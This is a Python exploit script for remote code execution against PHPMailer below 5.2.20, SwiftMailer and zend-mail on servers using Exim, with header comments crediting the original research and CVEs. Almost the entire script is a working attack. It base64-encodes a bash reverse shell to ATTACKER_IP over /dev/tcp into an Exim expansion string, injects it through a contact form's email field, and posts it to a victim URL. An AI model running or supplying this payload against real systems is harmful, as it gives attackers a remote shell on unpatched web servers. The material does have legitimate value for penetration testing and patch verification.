#!/usr/bin/python
#
# Exploit Title: [RCE for PHPMailer < 5.2.20 with Exim MTA]
# Date: [16/06/2017]
# Exploit Author: [@phackt_ul]
# Software Link: [https://github.com/PHPMailer/PHPMailer]
# Version: [< 5.2.20]
# Tested on: [Debian x86/x64]
# CVE : [CVE-2016-10033,CVE-2016-10074,CVE-2016-10034,CVE-2016-10045]
#
# @phackt_ul - https://phackt.com
#
# Find the last updated version here: https://raw.githubusercontent.com/phackt/pentest/master/exploits/rce_phpmailer_exim.py
#
# All credits go to Dawid Golunski (@dawid_golunski) - https://legalhackers.com
# and its research on PHP libraries vulns
#
# PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)
# PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) - escapeshellarg() bypass
# SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
# Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)
#
# ExploitBox project:
# https://ExploitBox.io
#
# Full advisory URL:
# https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
# https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html
# http://pwnscriptum.com/
#
# --------------------------------------------------------
# Enhanced for Exim MTA
#
# N.B:
# The original author's method in the PHPMailer POC (for sendmail MTA) uses the RFC 3696
# double quotes technique associated with the -oQ -X options to log mailer traffic and to create
# the backdoor. This technique is not facing some payload size issues because the payload
# was in the email body.
#
# For Exim:
# The original author's Wordpress 4.6 POC for Exim combines the comment syntax (RFC 822)
# and the Exim expansion mode techniques. The use of substr on spool_directory and tod_log
# expansion variables in order to bypass the PHP mail() escaping may leads to large
# email addresses payloads. However the comment syntax validateAddress() technique does not
# face any size limitation but its use can not be applied for PHPMailer < 5.2.20.
#
# Goal:
# The use of double quotes validateAdresse() technique (and it's patch bypass for PHPMailer < 5.5.20)
# combined with the Exim expansion mode technique may leads to large payloads quickly facing addresses
# size limit here (260 chars) and so not matching the pcre8 regexp in the validateAddress() function.
# We are now base64 encoding the command in order to bypass escapeshellcmd() and allowing larger payloads.
#
#
# Usage:
# ./rce_phpmailer_exim4.py -url http://victim/phpmailer/ -cf contact_form.php -ip 192.168.1.109 -p 1337
#
#
# Requirements:
# - Vulnerable PHP libraries
# - Exim MTA Agent
#
#
# Disclaimer:
# For testing purposes only on your local machine - http://pwnscriptum.com/PwnScriptum_PHPMailer_PoC_contactform.zip

import argparse
import urllib
import urllib2
import base64

# Prepare command for Exim expansion mode in order
def prepare_cmd(cmd):
    return '${run{${base64d:%s}}}' % base64.b64encode(cmd)

# Send Request method
def send_request(req):
    try:
        urllib2.urlopen(req)
    except urllib2.HTTPError, e:
        print "[!] Got HTTP error: [%d] when trying to reach " % e.code + req.get_full_url() + " - Check the URL!\n\n"
        exit(3)
    except urllib2.URLError, err:
        print "[!] Got the '%s' error when trying to reach " % str(err.reason) + req.get_full_url() + " - Check the URL!\n\n"
        exit(4)

# Parse input args
parser = argparse.ArgumentParser(prog='rce_phpmailer_exim4.py', description='PHPMailer / Zend-mail / SwiftMailer - RCE Exploit for Exim4 based on LegalHackers sendmail version')
parser.add_argument('-url', dest='WEBAPP_BASE_URL', required=True,  help='WebApp Base Url')
parser.add_argument('-cf',  dest='CONTACT_SCRIPT',  required=True,  help='Contact Form scriptname')
parser.add_argument('-ip',  dest='ATTACKER_IP',    required=True,  help='Attacker IP for reverse shell')
parser.add_argument('-p',   dest='ATTACKER_PORT',  required=False, help='Attackers Port for reverse shell', default="8888")
parser.add_argument('--post-action', dest='POST_ACTION',  required=False, help='Overrides POST "action" field name',         default="send")
parser.add_argument('--post-name',   dest='POST_NAME',    required=False, help='Overrides POST "name of sender" field name', default="name")
parser.add_argument('--post-email',  dest='POST_EMAIL',   required=False, help='Overrides POST "email" field name',          default="email")
parser.add_argument('--post-msg',    dest='POST_MSG',     required=False, help='Overrides POST "message" field name',        default="msg")
args = parser.parse_args()

CONTACT_SCRIPT_URL = args.WEBAPP_BASE_URL + args.CONTACT_SCRIPT

# Show params
print """[+] Setting vars to: \n
WEBAPP_BASE_URL      = [%s]
CONTACT_SCRIPT       = [%s]
ATTACKER_IP          = [%s]
ATTACKER_PORT        = [%s]
POST_ACTION          = [%s]
POST_NAME            = [%s]
POST_EMAIL           = [%s]
POST_MSG             = [%s]
""" % (args.WEBAPP_BASE_URL, args.CONTACT_SCRIPT, args.ATTACKER_IP, args.ATTACKER_PORT, args.POST_ACTION, args.POST_NAME, args.POST_EMAIL, args.POST_MSG)

# Ask for mail library
print "[+] Choose your target / payload: "
print "\033[1;34m"
print "[1] PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)"
print "    SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)"
print "    Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)\n"
print "[2] PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) - escapeshellarg() bypass"
print "\033[0m"

try:
    target = int(raw_input('[?] Select target [1-2]: '))
except ValueError:
    print "Not a valid choice. Exiting\n"
    exit(2)

if (target>2):
    print "No such target. Exiting\n"
    exit(3)

################################
# Payload
################################
cmd = "/bin/bash -c '0<&196;exec 196<>/dev/tcp/%s/%s;nohup sh <&196 >&196 2>&196 &'" % (args.ATTACKER_IP, args.ATTACKER_PORT)
prepared_cmd = prepare_cmd(cmd)

payload = '"a\\" -be ' + prepared_cmd + ' "@a.co'

# Update payloads for PHPMailer bypass (PHPMailer < 5.2.20)
if target == 2:
    payload = "\"a\\' -be " + prepared_cmd + " \"@a.co"

################################
# Attack episode
# This step will execute the reverse shell
################################

# Form fields
post_fields = {'action': "%s" % args.POST_ACTION, "%s" % args.POST_NAME: 'Jas Fasola', "%s" % args.POST_EMAIL: payload, "%s" % args.POST_MSG: 'Really important message'}

# Print relevant information
print "\n[+] Executing command on victim server\n"
print '[!] command: [%s]' % cmd
print '[!] payload: [%s]' % payload
print '[!] post_fields: [%s]\n' % str(post_fields)

data = urllib.urlencode(post_fields)
req = urllib2.Request(CONTACT_SCRIPT_URL, data)
send_request(req)

print "\033[1;32m[+] You should check your listener and cross the fingers ;)\033[0m\n"